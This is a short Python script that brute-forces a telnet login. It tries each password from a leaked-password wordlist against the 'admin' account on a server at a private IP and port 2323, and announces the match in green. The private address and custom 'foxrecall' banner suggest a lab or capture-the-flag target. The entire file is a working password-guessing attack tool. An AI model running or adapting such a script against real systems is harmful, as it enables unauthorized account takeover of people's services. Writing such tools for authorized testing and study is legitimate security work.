import telnetlib

def print_green(text):
 
    green_color_code = "\033[92m"
    reset_color_code = "\033[0m"
    
    print(f"{green_color_code}{text}{reset_color_code}")   

def brute_force_telnet(ip, username, wordlist):
    with open(wordlist, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        try:
            tn = telnetlib.Telnet(ip, 2323)
            tn.read_until(b"Welcome to foxrecall server\r\nusername: \r\n")
            #tn.write(username)
            tn.write(username.encode('ascii'))
            ### after several tries and using wireshark to follow to tcp flow i found that i need to type enter to get script working
            tn.write(b"\r\n")
            tn.read_until(b"Password")
            tn.write(password.encode('ascii'))
            tn.write(b"\r\n")
            response = tn.read_until(b"bye!").decode('ascii')
            print(password)
            if "Wrong password for user admin" not in response:
                print_green("password found "+password)
                tn.close()
                return True
            tn.close()
        except Exception as e:
            print(f"Connection failed: {e}")
            return False

    print("Password not found in wordlist.")
    return False

if __name__ == "__main__":
    ip = "10.1.30.103"  # Replace with the target IP
    username = "admin"
    wordlist = "darkweb2017-top10000.txt"  # Replace with your wordlist file path
    brute_force_telnet(ip, username, wordlist)
